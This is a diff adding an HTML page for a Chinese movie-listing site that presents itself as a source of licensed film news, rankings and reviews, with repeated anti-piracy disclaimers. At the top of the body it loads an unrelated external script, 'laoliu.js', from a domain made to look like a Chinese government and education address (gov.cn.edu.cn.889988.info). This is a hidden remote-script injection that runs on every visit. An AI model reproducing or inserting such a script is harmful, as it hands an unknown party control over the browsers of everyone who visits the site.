@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>云播电影网 - 正版影讯、热映排行与云端片单推荐</title>
+<meta name="description" content="云播电影网(yunbodianyingwang-h5.github.io)提供正版电影影讯、院线热映排行、类型片单与影评资讯，移动端自适应，仅作合法影视信息与学习交流。">
+<meta name="keywords" content="云播电影网,正版影讯,电影排行榜,云端片单,热映推荐,影评,影视资讯">
+<meta name="author" content="云播电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://yunbodianyingwang-h5.github.io/">
+<style>
+/* ===== 重置 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;line-height:1.65;color:#0f172a;background:#f5f8fc}
+a{color:inherit;text-decoration:none}
+
+/* ===== 导航 ===== */
+.header{position:sticky;top:0;z-index:1000;background:rgba(8,47,73,.95);backdrop-filter:blur(8px);color:#fff}
+.nav{max-width:1200px;margin:0 auto;height:60px;padding:0 1rem;display:flex;align-items:center;justify-content:space-between}
+.brand{font-weight:800;font-size:1.25rem}
+.brand b{color:#38bdf8}
+.menu{list-style:none;display:flex;gap:.35rem}
+.menu a{padding:.45rem .9rem;border-radius:999px;font-size:.9rem;color:#cbd5e1;transition:.25s}
+.menu a:hover{background:#0ea5e9;color:#fff}
+.burger{display:none;font-size:1.5rem;cursor:pointer}
+@media(max-width:768px){.menu{display:none}.burger{display:block}}
+
+/* ===== 栏目1 Hero+云卡片网格 ===== */
+.hero{background:radial-gradient(1000px 380px at 12% 0%,#38bdf8 0,transparent 55%),linear-gradient(160deg,#082f49,#0c4a6e)}
+.hero-box{max-width:1200px;margin:0 auto;padding:74px 1rem 46px;display:grid;grid-template-columns:1.05fr .95fr;gap:2rem;align-items:center;color:#fff}
+.hero h1{font-size:clamp(1.9rem,4.5vw,3rem);line-height:1.15;margin-bottom:1rem}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,#38bdf8,#a5f3fc);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero p{color:#e0f2fe;max-width:540px;margin-bottom:1.6rem}
+.cta{display:inline-block;background:#0ea5e9;color:#fff;font-weight:700;padding:.8rem 1.8rem;border-radius:999px}
+.cta.ghost{background:transparent;border:1px solid #7dd3fc;color:#fff;margin-left:.6rem}
+.grid4{display:grid;grid-template-columns:repeat(2,1fr);gap:1rem}
+.fcard{border-radius:16px;overflow:hidden;background:#0c2233;border:1px solid #0e7490}
+.fcard .ph{height:122px;display:flex;align-items:center;justify-content:center;font-size:2.4rem;color:#fff}
+.fcard:nth-child(1) .ph{background:linear-gradient(135deg,#0ea5e9,#2563eb)}
+.fcard:nth-child(2) .ph{background:linear-gradient(135deg,#06b6d4,#0d9488)}
+.fcard:nth-child(3) .ph{background:linear-gradient(135deg,#818cf8,#6366f1)}
+.fcard:nth-child(4) .ph{background:linear-gradient(135deg,#22d3ee,#38bdf8)}
+.fcard .fb{padding:.8rem 1rem}
+.fcard h3{font-size:.95rem}
+.fcard span{font-size:.75rem;color:#94a3b8}
+@media(max-width:860px){.hero-box{grid-template-columns:1fr}.grid4{grid-template-columns:1fr 1fr}}
+
+/* ===== 栏目2 热映排行 表格+评分条 ===== */
+.section{padding:56px 1rem}
+.wrap{max-width:1200px;margin:0 auto}
+.sec-title{font-size:1.7rem;font-weight:800}
+.sec-sub{color:#64748b;margin:.4rem 0 1.6rem}
+.rank-layout{display:grid;grid-template-columns:1.7fr .9fr;gap:1.6rem}
+@media(max-width:880px){.rank-layout{grid-template-columns:1fr}}
+table.rank{width:100%;border-collapse:separate;border-spacing:0 .7rem}
+table.rank tr{background:#fff;border:1px solid #e0f2fe;border-radius:12px;transition:.25s}
+table.rank tr:hover{box-shadow:0 8px 24px rgba(14,165,233,.12);transform:translateX(3px)}
+table.rank td{padding:.9rem .8rem;vertical-align:middle}
+.num{width:46px;text-align:center}
+.circle{display:inline-flex;width:34px;height:34px;align-items:center;justify-content:center;border-radius:50%;color:#fff;font-weight:700;font-size:.85rem;background:#64748b}
+.circle.g{background:linear-gradient(135deg,#0ea5e9,#0369a1)}
+.circle.s{background:linear-gradient(135deg,#cbd5e1,#94a3b8)}
+.circle.b{background:linear-gradient(135deg,#06b6d4,#0e7490)}
+.rinfo h3{font-size:.98rem}
+.rinfo small{color:#6b7280;font-size:.78rem}
+.src{display:inline-block;font-size:.7rem;padding:.15rem .5rem;border-radius:10px;margin-right:.3rem;background:#e0f2fe;color:#0369a1}
+.score{text-align:right;white-space:nowrap}
+.score b{color:#0369a1;font-size:1.1rem}
+.bar{display:inline-block;width:90px;height:6px;border-radius:4px;background:#e0f2fe;overflow:hidden;margin-top:.3rem;vertical-align:middle}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,#0ea5e9,#22d3ee)}
+.side .widget{background:#fff;border:1px solid #e0f2fe;border-radius:16px;padding:1.2rem;margin-bottom:1.2rem}
+.side h3{font-size:1rem;margin-bottom:.9rem}
+.gtag{display:inline-block;padding:.3rem .8rem;border:1px solid #bae6fd;border-radius:20px;font-size:.8rem;color:#0369a1;margin:.2rem;background:#f0f9ff}
+
+/* ===== 栏目3 云端分类 标签+卡片墙 ===== */
+.cats{background:#fff}
+.tabs{display:flex;gap:.6rem;overflow-x:auto;padding-bottom:.6rem;margin-bottom:1.4rem}
+.tab{flex:0 0 auto;padding:.5rem 1.1rem;border:1px solid #e5e7eb;border-radius:999px;background:#f9fafb;font-size:.85rem;cursor:pointer}
+.tab.active{background:#0ea5e9;color:#fff;border-color:#0ea5e9}
+.wall{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.1rem}
+.ccard{border-radius:14px;overflow:hidden;background:#f5f8fc;border:1px solid #e0f2fe;transition:.25s}
+.ccard:hover{transform:translateY(-5px);box-shadow:0 12px 30px rgba(14,165,233,.15)}
+.ccard .ci{height:118px;display:flex;align-items:center;justify-content:center;font-size:2.6rem;color:#fff}
+.ccard:nth-child(1) .ci{background:linear-gradient(135deg,#0ea5e9,#2563eb)}
+.ccard:nth-child(2) .ci{background:linear-gradient(135deg,#06b6d4,#0d9488)}
+.ccard:nth-child(3) .ci{background:linear-gradient(135deg,#818cf8,#6366f1)}
+.ccard:nth-child(4) .ci{background:linear-gradient(135deg,#22d3ee,#38bdf8)}
+.ccard:nth-child(5) .ci{background:linear-gradient(135deg,#34d399,#059669)}
+.ccard:nth-child(6) .ci{background:linear-gradient(135deg,#fbbf24,#f59e0b)}
+.ccard:nth-child(7) .ci{background:linear-gradient(135deg,#fb7185,#f43f5e)}
+.ccard:nth-child(8) .ci{background:linear-gradient(135deg,#60a5fa,#3b82f6)}
+.ccard .cb{padding:1rem}
+.ccard h3{font-size:.95rem}
+.ccard small{color:#6b7280}
+
+/* ===== 栏目4 影讯瀑布 + 关于联系 ===== */
+.reviews{background:#f5f8fc}
+.masonry{column-count:3;column-gap:1.1rem}
+@media(max-width:900px){.masonry{column-count:2}}
+@media(max-width:560px){.masonry{column-count:1}}
+.rcard{break-inside:avoid;background:#fff;border:1px solid #e0f2fe;border-radius:16px;overflow:hidden;margin-bottom:1.1rem}
+.rcard .cv{height:130px;display:flex;align-items:center;justify-content:center;font-size:2.6rem;color:#fff}
+.rcard:nth-child(1) .cv{background:linear-gradient(135deg,#0ea5e9,#082f49)}
+.rcard:nth-child(2) .cv{background:linear-gradient(135deg,#06b6d4,#0e7490)}
+.rcard:nth-child(3) .cv{background:linear-gradient(135deg,#818cf8,#4338ca)}
+.rcard:nth-child(4) .cv{background:linear-gradient(135deg,#22d3ee,#0c4a6e)}
+.rcard:nth-child(5) .cv{background:linear-gradient(135deg,#34d399,#047857)}
+.rcard:nth-child(6) .cv{background:linear-gradient(135deg,#38bdf8,#0369a1)}
+.rcard .rb{padding:1rem 1.1rem}
+.stars{color:#f59e0b;font-size:.85rem}
+.rcard h3{font-size:.98rem;margin:.3rem 0}
+.rcard p{font-size:.84rem;color:#475569}
+.author{display:flex;align-items:center;gap:.5rem;margin-top:.8rem;font-size:.78rem;color:#64748b}
+.avatar{width:26px;height:26px;border-radius:50%;background:#0ea5e9;color:#fff;display:flex;align-items:center;justify-content:center;font-size:.7rem}
+
+.about{background:linear-gradient(160deg,#082f49,#0c4a6e);color:#e5e7eb}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:2rem}
+@media(max-width:820px){.about-grid{grid-template-columns:1fr}}
+.about h2{color:#fff;font-size:1.6rem;margin-bottom:.5rem}
+.about p.lead{color:#7dd3fc;margin-bottom:1.2rem}
+.tl{list-style:none;border-left:2px solid #0e7490;padding-left:1.2rem;display:grid;gap:1.1rem}
+.tl li{position:relative}
+.tl li::before{content:"";position:absolute;left:-1.55rem;top:.35rem;width:12px;height:12px;border-radius:50%;background:#38bdf8}
+.tl .t{font-size:.78rem;color:#7dd3fc}
+.tl h4{color:#fff;font-size:.98rem;margin:.1rem 0}
+.tl p{font-size:.84rem;color:#cbd5e1}
+.form{display:grid;gap:.8rem;max-width:440px}
+.form input,.form textarea{padding:.8rem 1rem;border-radius:10px;border:1px solid #0e7490;background:#0b1f2e;color:#e5e7eb;font:inherit}
+.form input::placeholder,.form textarea::placeholder{color:#9ca3af}
+.form button{padding:.85rem 1rem;border:0;border-radius:10px;background:#0ea5e9;color:#fff;font-weight:700;cursor:pointer}
+.info{margin-top:1rem;font-size:.85rem;color:#cbd5e1;line-height:1.8}
+.info b{color:#7dd3fc}
+
+/* ===== 页脚 ===== */
+.footer{background:#020617;color:#94a3b8;text-align:center;padding:26px 1rem;font-size:.82rem}
+.footer a{margin:0 .5rem;color:#cbd5e1}
+.footer a:hover{color:#38bdf8}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="header">
+  <nav class="nav" aria-label="主导航">
+    <div class="brand">云播<b>电影网</b></div>
+    <ul class="menu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#rank">热映排行</a></li>
+      <li><a href="#cats">云端片单</a></li>
+      <li><a href="#reviews">影讯影评</a></li>
+      <li><a href="#about">关于/联系</a></li>
+    </ul>
+    <div class="burger" aria-label="菜单">☰</div>
+  </nav>
+</header>
+
+<!-- 栏目1 -->
+<section class="hero" id="home">
+  <div class="hero-box">
+    <div>
+      <h1>云播电影网 · 聚合<em>正版云端影讯</em></h1>
+      <p>「云播」此处指云端影讯与智能片单推荐：聚合院线热映、正版流媒体资讯、类型片单与影评。全站不提供在线播放器、盗版资源、磁力与网盘解析。</p>
+      <a href="#rank" class="cta">看热映排行</a>
+      <a href="#cats" class="cta ghost">逛云端片单</a>
+    </div>
+    <div class="grid4">
+      <article class="fcard"><div class="ph">☁️</div><div class="fb"><h3>云端影讯</h3><span>每日正版更新</span></div></article>
+      <article class="fcard"><div class="ph">🏆</div><div class="fb"><h3>热映排行榜</h3><span>综合口碑评分</span></div></article>
+      <article class="fcard"><div class="ph">🗂️</div><div class="fb"><h3>智能片单</h3><span>按场景/心情推荐</span></div></article>
+      <article class="fcard"><div class="ph">✍️</div><div class="fb"><h3>影评与资讯</h3><span>新片解读与行业动态</span></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2 -->
+<section class="section" id="rank">
+  <div class="wrap">
+    <h2 class="sec-title">热映与正版排行</h2>
+    <p class="sec-sub">演示数据，按综合口碑排序；内链均用 # 占位。仅整理院线/正规流媒体公开资讯。</p>
+    <div class="rank-layout">
+      <table class="rank">
+        <tbody>
+          <tr><td class="num"><span class="circle g">1</span></td><td class="rinfo"><h3><span class="src">院线</span><a href="#">《云岸追光》</a></h3><small>剧情/文艺 · 2025 · 正版资讯</small></td><td class="score"><b>9.3</b><br><span class="bar"><i style="width:93%"></i></span></td></tr>
+          <tr><td class="num"><span class="circle s">2</span></td><td class="rinfo"><h3><span class="src">流媒体</span><a href="#">《深空协议》</a></h3><small>科幻 · 2025 · 高清重制资讯</small></td><td class="score"><b>9.1</b><br><span class="bar"><i style="width:91%"></i></span></td></tr>
+          <tr><td class="num"><span class="circle b">3</span></td><td class="rinfo"><h3><span class="src">院线</span><a href="#">《人间小满》</a></h3><small>家庭/喜剧 · 2024 · 合家欢推荐</small></td><td class="score"><b>8.9</b><br><span class="bar"><i style="width:89%"></i></span></td></tr>
+          <tr><td class="num"><span class="circle">4</span></td><td class="rinfo"><h3><span class="src">流媒体</span><a href="#">《无声海岸》</a></h3><small>悬疑 · 2025 · 影评人精选</small></td><td class="score"><b>8.7</b><br><span class="bar"><i style="width:87%"></i></span></td></tr>
+          <tr><td class="num"><span class="circle">5</span></td><td class="rinfo"><h3><span class="src">院线</span><a href="#">《山海动画集》</a></h3><small>动画 · 2024 · 全龄向片单</small></td><td class="score"><b>8.6</b><br><span class="bar"><i style="width:86%"></i></span></td></tr>
+          <tr><td class="num"><span class="circle">6</span></td><td class="rinfo"><h3><span class="src">资讯</span><a href="#">《城市云图》</a></h3><small>纪录 · 2025 · 正版影像</small></td><td class="score"><b>8.4</b><br><span class="bar"><i style="width:84%"></i></span></td></tr>
+        </tbody>
+      </table>
+      <aside class="side">
+        <div class="widget">
+          <h3>云端标签</h3>
+          <span class="gtag">院线新片 #</span><span class="gtag">流媒体 #</span><span class="gtag">合家欢 #</span>
+          <span class="gtag">科幻 #</span><span class="gtag">悬疑 #</span><span class="gtag">纪录片 #</span>
+        </div>
+        <div class="widget">
+          <h3>站点说明</h3>
+          <p style="font-size:.84rem;color:#6b7280">云播电影网仅发布影视资讯与正版推荐，不提供盗版资源、在线播放与下载入口，不含磁力/网盘解析。</p>
+        </div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3 -->
+<section class="section cats" id="cats">
+  <div class="wrap">
+    <h2 class="sec-title">云端分类片单</h2>
+    <p class="sec-sub">点击标签为演示交互（纯前端），卡片内链统一用 #。</p>
+    <div class="tabs">
+      <span class="tab active">全部</span>
+      <span class="tab">院线新片</span>
+      <span class="tab">流媒体精选</span>
+      <span class="tab">科幻</span>
+      <span class="tab">悬疑</span>
+      <span class="tab">家庭喜剧</span>
+      <span class="tab">动画</span>
+      <span class="tab">纪录片</span>
+    </div>
+    <div class="wall">
+      <article class="ccard"><div class="ci">🎬</div><div class="cb"><h3>院线新片</h3><small>正版上映资讯 #</small></div></article>
+      <article class="ccard"><div class="ci">📺</div><div class="cb"><h3>流媒体精选</h3><small>合规平台片单 #</small></div></article>
+      <article class="ccard"><div class="ci">🚀</div><div class="cb"><h3>科幻电影</h3><small>硬核与哲思 #</small></div></article>
+      <article class="ccard"><div class="ci">🔍</div><div class="cb"><h3>悬疑电影</h3><small>推理心理 #</small></div></article>
+      <article class="ccard"><div class="ci">😄</div><div class="cb"><h3>家庭喜剧</h3><small>合家欢推荐 #</small></div></article>
+      <article class="ccard"><div class="ci">🎨</div><div class="cb"><h3>动画电影</h3><small>全龄向片单 #</small></div></article>
+      <article class="ccard"><div class="ci">📹</div><div class="cb"><h3>纪录片</h3><small>真实影像 #</small></div></article>
+      <article class="ccard"><div class="ci">☁️</div><div class="cb"><h3>场景片单</h3><small>按心情/时段 #</small></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4：影讯瀑布 + 关于联系 -->
+<section class="section reviews" id="reviews">
+  <div class="wrap">
+    <h2 class="sec-title">影讯与影评专栏</h2>
+    <p class="sec-sub">差异化瀑布流卡片，仅做内容评价与资讯不提供资源。</p>
+    <div class="masonry">
+      <article class="rcard"><div class="cv">🎬</div><div class="rb"><div class="stars">★★★★★ 9.3</div><h3>《云岸追光》的影像克制</h3><p>以海岸小城为舞台，用自然光与长镜头铺陈亲情离别的层次，表演极为扎实。</p><div class="author"><span class="avatar">影</span>影评员·韩黎</div></div></article>
+      <article class="rcard"><div class="cv">🚀</div><div class="rb"><div class="stars">★★★★☆ 9.1</div><h3>《深空协议》的科幻设定</h3><p>硬科幻框架下的伦理讨论完整，视效服务于叙事，避免空洞炫技。</p><div class="author"><span class="avatar">科</span>科幻观察·罗川</div></div></article>
+      <article class="rcard"><div class="cv">📺</div><div class="rb"><div class="stars">★★★★☆ 8.8</div><h3>流媒体新片如何选</h3><p>从正版平台公开信息出发，给出按片长、题材、评分筛选的高效看片法。</p><div class="author"><span class="avatar">云</span>云端选片·周可可</div></div></article>
+      <article class="rcard"><div class="cv">🎨</div><div class="rb"><div class="stars">★★★★★ 9.0</div><h3>动画特辑：色彩与叙事</h3><p>近年高分动画在美术与情感上双线发力，适合家庭与成人分单观看。</p><div class="author"><span class="avatar">动</span>动画控·小满</div></div></article>
+      <article class="rcard"><div class="cv">🔍</div><div class="rb"><div class="stars">★★★★☆ 8.7</div><h3>悬疑资讯：信息释放节奏</h3><p>以《无声海岸》为例，谈正版悬疑片如何靠人物动机而非惊悚噱头取胜。</p><div class="author"><span class="avatar">悬</span>悬疑向·陈默</div></div></article>
+      <article class="rcard"><div class="cv">🏆</div><div class="rb"><div class="stars">★★★★★ 9.2</div><h3>颁奖季云端清单</h3><p>结合电影节与评分口碑，整理少而精的正版高清资讯清单，便于跟进。</p><div class="author"><span class="avatar">奖</span>口碑组·林一</div></div></article>
+    </div>
+  </div>
+</section>
+
+<section class="section about" id="about">
+  <div class="wrap about-grid">
+    <div>
+      <h2>关于云播电影网</h2>
+      <p class="lead">我们用「云端」做影讯聚合与智能片单，帮助观众高效发现正版好电影。</p>
+      <ul class="tl">
+        <li><div class="t">内容定位</div><h4>合法影视资讯</h4><p>只整理院线、正规流媒体、公开正版发行与电影节信息，不采集盗版资源，不架设播放器。</p></li>
+        <li><div class="t">更新机制</div><h4>每日影讯+周片单</h4><p>热映排行、流媒体精选、场景片单与影评轮流更新，保持页面可抓取与新鲜度。</p></li>
+        <li><div class="t">技术合规</div><h4>响应式语义化</h4><p>header/nav/section/article 地标标签、canonical、移动端媒体查询，利于必应收录。</p></li>
+        <li><div class="t">联系合作</div><h4>仅限合规商务</h4><p>正版宣发、影评投稿、平台资讯合作可通过表单联系。</p></li>
+      </ul>
+    </div>
+    <div>
+      <form class="form" onsubmit="event.preventDefault();alert('演示提交成功（不对接后端）');">
+        <input type="text" name="name" placeholder="称呼" required>
+        <input type="email" name="email" placeholder="邮箱" required>
+        <input type="text" name="subject" placeholder="合作/留言主题" required>
+        <textarea name="msg" placeholder="正版宣发、影评投稿或云端片单建议" required></textarea>
+        <button type="submit">提交联系</button>
+      </form>
+      <div class="info">
+        <div><b>网址：</b>https://yunbodianyingwang-h5.github.io</div>
+        <div><b>邮箱：</b>contact@yunbodianyingwang-h5.github.io（演示）</div>
+        <div><b>声明：</b>本页为演示站点，不提供淫秽、盗版、磁力、网盘解析、在线播放等内容；实际运营请使用已获授权片源信息。</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div>
+    <a href="#home">首页</a><a href="#rank">热映排行</a><a href="#cats">云端片单</a><a href="#reviews">影讯影评</a><a href="#about">关于/联系</a>
+  </div>
+  <p style="margin-top:.6rem">© 2026 云播电影网（演示）· yunbodianyingwang-h5.github.io · 仅作合法影视资讯与学习用途</p>
+</footer>
+
+</body>
+</html>
